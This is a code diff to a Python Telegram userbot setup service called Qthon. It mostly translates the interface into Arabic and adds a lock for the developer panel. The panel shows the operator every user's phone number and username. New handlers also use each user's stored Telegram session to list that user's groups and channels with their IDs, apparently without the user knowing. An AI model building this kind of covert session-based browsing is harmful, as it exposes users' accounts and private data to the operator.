@@ -63,9 +63,9 @@ client_me = {}
 command_stats = {}
 user_info_cache = {}
 
-# مطورين تم التحقق منهم
 verified_devs = set()
 pending_verify = {}
+dev_access_locked = False  # قفل دخول لوحة المطور للآخرين
 
 def run_async_in_main_loop(coro):
     future = asyncio.run_coroutine_threadsafe(coro, main_loop)
@@ -463,38 +463,43 @@ async def notify_dev(message):
     except Exception as e:
         logger.error(f"Failed to notify dev: {e}")
 
+def dev_panel_markup():
+    lock_text = "فتح خيارات المطور" if dev_access_locked else "قفل خيارات المطور"
+    lock_data = b"dev_lock"
+    buttons = [
+        [Button.inline("عدد المستخدمين", b"dev_users"),
+         Button.inline("النشطاء حالياً", b"dev_active")],
+        [Button.inline("أكثر الأوامر", b"dev_topcmd"),
+         Button.inline("قائمة المجموعات", b"dev_groups")],
+        [Button.inline("قائمة القنوات", b"dev_channels"),
+         Button.inline("إذاعة", b"dev_broadcast")],
+        [Button.inline(lock_text, lock_data)],
+    ]
+    return buttons
+
 @bot.on(events.NewMessage(pattern='/start'))
 async def bot_start(event):
     user_id = event.sender_id
     if is_dev(user_id):
-        # لوحة تحكم المطور
-        buttons = [
-            [Button.inline("USERS COUNT", b"dev_users"),
-             Button.inline("ACTIVE NOW", b"dev_active")],
-            [Button.inline("TOP COMMANDS", b"dev_topcmd"),
-             Button.inline("GROUPS LIST", b"dev_groups")],
-            [Button.inline("CHANNELS LIST", b"dev_channels"),
-             Button.inline("BROADCAST", b"dev_broadcast")],
-        ]
+        buttons = dev_panel_markup()
         await event.respond(
-            "**Qthon Developer Panel**\n\nSelect an option.",
+            "**لوحة تحكم Qthon**\n\nاختر خياراً.",
             buttons=buttons,
             parse_mode='md'
         )
         return
 
-    # رسالة المستخدم العادي
+    # رسالة المستخدم العادي – بدون زر التنصيب
     buttons = [
-        [Button.url("GET MY DATA", "https://my.telegram.org/apps")],
-        [Button.url("SETUP GUIDE", os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'http://localhost:5000'))],
-        [Button.inline("HOW TO GET DATA", b"how_to_get_data")],
-        [Button.inline("CONTROL", b"dev_login")],
+        [Button.url("الحصول على بياناتي", "https://my.telegram.org/apps")],
+        [Button.inline("كيفية جلب البيانات", b"how_to_get_data")],
+        [Button.inline("لوحة التحكم", b"dev_login")],
     ]
     await event.respond(
-        "**• To start Telethon Qthon Setup 🜲**\n\n"
-        "- You need your account information\n"
-        "- Open the bot app to begin\n"
-        "- Complete the required setup steps",
+        "**• لبدء إعداد Qthon تليثون 🜲**\n\n"
+        "- تحتاج معلومات حسابك\n"
+        "- افتح تطبيق البوت للبدء\n"
+        "- أكمل خطوات الإعداد المطلوبة",
         buttons=buttons,
         parse_mode='md'
     )
@@ -502,20 +507,23 @@ async def bot_start(event):
 @bot.on(events.CallbackQuery(data=b"how_to_get_data"))
 async def how_to_get_data(event):
     await event.answer(
-        "1. Go to my.telegram.org\n"
-        "2. Login with your phone number\n"
-        "3. Go to API development tools\n"
-        "4. Get your api_id and api_hash",
+        "1. اذهب إلى my.telegram.org\n"
+        "2. سجل الدخول برقم هاتفك\n"
+        "3. اذهب إلى أدوات تطوير API\n"
+        "4. احصل على api_id و api_hash",
         alert=True
     )
 
 @bot.on(events.CallbackQuery(data=b"dev_login"))
 async def dev_login(event):
+    if dev_access_locked and not is_dev(event.sender_id):
+        await event.answer("خيارات المطور مقفلة حالياً", alert=True)
+        return
     pending_verify[event.sender_id] = True
-    buttons = [[Button.request_phone("SHARE PHONE NUMBER", resize=True)]]
+    buttons = [[Button.request_phone("مشاركة رقم الهاتف", resize=True)]]
     await event.edit(
-        "**Developer Verification**\n\n"
-        "Share your phone number to verify as owner.",
+        "**التحقق من المطور**\n\n"
+        "شارك رقم هاتفك للتحقق كمالك.",
         buttons=buttons,
         parse_mode='md'
     )
@@ -526,6 +534,10 @@ async def handle_phone_verify(event):
     user_id = event.sender_id
     if user_id not in pending_verify:
         return
+    if dev_access_locked and not is_dev(user_id):
+        del pending_verify[user_id]
+        await event.respond("**التحقق معطل حالياً**\nخيارات المطور مقفلة.", parse_mode='md')
+        return
     if event.message.contact:
         phone = f"+{event.message.contact.phone_number}"
     else:
@@ -535,93 +547,129 @@ async def handle_phone_verify(event):
     if phone == DEV_PHONE:
         verified_devs.add(user_id)
         del pending_verify[user_id]
-        buttons = [
-            [Button.inline("USERS COUNT", b"dev_users"),
-             Button.inline("ACTIVE NOW", b"dev_active")],
-            [Button.inline("TOP COMMANDS", b"dev_topcmd"),
-             Button.inline("GROUPS LIST", b"dev_groups")],
-            [Button.inline("CHANNELS LIST", b"dev_channels"),
-             Button.inline("BROADCAST", b"dev_broadcast")],
-        ]
+        buttons = dev_panel_markup()
         await event.respond(
-            "**Identity Verified!**\n\nWelcome to the Developer Panel.",
+            "**تم التحقق من الهوية!**\n\nمرحباً بك في لوحة التحكم.",
             buttons=buttons,
             parse_mode='md'
         )
-        await notify_dev(f"Developer verified via phone: {phone}")
+        await notify_dev(f"تم تفعيل مطور جديد: {phone}")
     else:
-        await event.respond("**Verification Failed**\nPhone does not match.", parse_mode='md')
+        await event.respond("**فشل التحقق**\nرقم الهاتف غير مطابق.", parse_mode='md')
 
 @bot.on(events.CallbackQuery())
 async def dev_callback(event):
     data = event.data.decode()
     if not is_dev(event.sender_id):
-        await event.answer("Access denied", alert=True)
+        await event.answer("غير مصرح", alert=True)
+        return
+
+    if data == "dev_back":
+        await event.edit(
+            "**لوحة تحكم Qthon**\n\nاختر خياراً.",
+            buttons=dev_panel_markup(),
+            parse_mode='md'
+        )
+        await event.answer()
+        return
+
+    if data == "dev_lock":
+        global dev_access_locked
+        dev_access_locked = not dev_access_locked
+        state = "مقفلة" if dev_access_locked else "مفتوحة"
+        await event.answer(f"خيارات المطور الآن {state}", alert=True)
+        await event.edit(
+            "**لوحة تحكم Qthon**\n\nاختر خياراً.",
+            buttons=dev_panel_markup(),
+            parse_mode='md'
+        )
         return
 
     if data == "dev_users":
         total = len(active_clients)
-        msg = f"**Total Registered Users:** {total}\n\n"
+        msg = f"**إجمالي المستخدمين المسجلين:** {total}\n\n"
         for phone, info in user_info_cache.items():
-            username = f"@{info['username']}" if info['username'] else "no username"
+            username = f"@{info['username']}" if info['username'] else "بدون معرف"
             msg += f"• {info['first_name']} | {username} | {phone}\n"
         if not user_info_cache:
-            msg += "No users found."
-        await event.edit(msg, parse_mode='md')
+            msg += "لا يوجد مستخدمين."
+        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])
 
     elif data == "dev_active":
         active_count = len(active_clients)
-        msg = f"**Currently Active:** {active_count}\n\n"
+        msg = f"**النشطاء حالياً:** {active_count}\n\n"
         for phone, client in active_clients.items():
             info = user_info_cache.get(phone, {})
             name = info.get('first_name', phone)
-            msg += f"• {name} | {phone}\n"
+            uname = info.get('username')
+            if uname:
+                display = f"{name} - @{uname}"
+            else:
+                display = f"{name} - {phone}"
+            msg += f"• {display}\n"
         if not active_clients:
-            msg += "No active sessions."
-        await event.edit(msg, parse_mode='md')
+            msg += "لا توجد جلسات نشطة."
+        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])
 
     elif data == "dev_topcmd":
         all_cmds = Counter()
         for cmds in command_stats.values():
             all_cmds.update(cmds)
         top = all_cmds.most_common(10)
-        msg = "**Top 10 Commands:**\n\n"
+        msg = "**أكثر 10 أوامر استخداماً:**\n\n"
         for i, (cmd, cnt) in enumerate(top, 1):
-            msg += f"{i}. .{cmd}: {cnt} times\n"
+            msg += f"{i}. .{cmd}: {cnt} مرة\n"
         if not top:
-            msg += "No commands used yet."
-        await event.edit(msg, parse_mode='md')
+            msg += "لم تُستخدم أوامر بعد."
+        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])
 
     elif data == "dev_groups":
-        msg = "**Groups:**\n\n"
-        for phone, info in user_info_cache.items():
-            groups = info.get('groups', [])
-            if groups:
-                msg += f"**{info.get('first_name', phone)}:**\n"
-                for g in groups[:5]:
-                    msg += f"  • {g['name']}\n"
-        if not msg.strip():
-            msg = "No groups found."
-        await event.edit(msg, parse_mode='md')
+        msg = "**المجموعات (حيّة):**\n\n"
+        found = False
+        for phone, client in active_clients.items():
+            try:
+                dialogs = await client.get_dialogs(limit=200)
+                groups = [d for d in dialogs if d.is_group and not d.is_channel]  # مجموعات فقط
+                if groups:
+                    found = True
+                    info = user_info_cache.get(phone, {})
+                    name = info.get('first_name', phone)
+                    msg += f"**{name}:**\n"
+                    for g in groups[:10]:
+                        msg += f"  • {g.name} (ID: {g.id})\n"
+            except:
+                pass
+        if not found:
+            msg += "لا توجد مجموعات."
+        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])
 
     elif data == "dev_channels":
-        msg = "**Channels:**\n\n"
-        for phone, info in user_info_cache.items():
-            channels = info.get('channels', [])
-            if channels:
-                msg += f"**{info.get('first_name', phone)}:**\n"
-                for c in channels[:5]:
-                    msg += f"  • {c['name']}\n"
-        if not msg.strip():
-            msg = "No channels found."
-        await event.edit(msg, parse_mode='md')
+        msg = "**القنوات (حيّة):**\n\n"
+        found = False
+        for phone, client in active_clients.items():
+            try:
+                dialogs = await client.get_dialogs(limit=200)
+                channels = [d for d in dialogs if d.is_channel and not d.is_group]  # قنوات فقط
+                if channels:
+                    found = True
+                    info = user_info_cache.get(phone, {})
+                    name = info.get('first_name', phone)
+                    msg += f"**{name}:**\n"
+                    for c in channels[:10]:
+                        msg += f"  • {c.name} (ID: {c.id})\n"
+            except:
+                pass
+        if not found:
+            msg += "لا توجد قنوات."
+        await event.edit(msg, parse_mode='md', buttons=[[Button.inline("رجوع", b"dev_back")]])
 
     elif data == "dev_broadcast":
-        await event.answer("Coming soon", alert=True)
+        await event.answer("قريباً", alert=True)
 
     await event.answer()
 
 # ======================== موقع الويب (إنجليزي) ========================
+# (لم يطرأ تغيير على الموقع)
 @app.route('/')
 def home():
     return """<!DOCTYPE html>
@@ -1087,7 +1135,6 @@ async function verify() {
     prog.finish();
     if (data.status === 'success') {
       showResult('Telethon installed successfully!', true);
-      // Auto refresh after 3 seconds
       setTimeout(() => { location.reload(); }, 3000);
     } else {
       showResult(data.message || 'Verification failed', false);
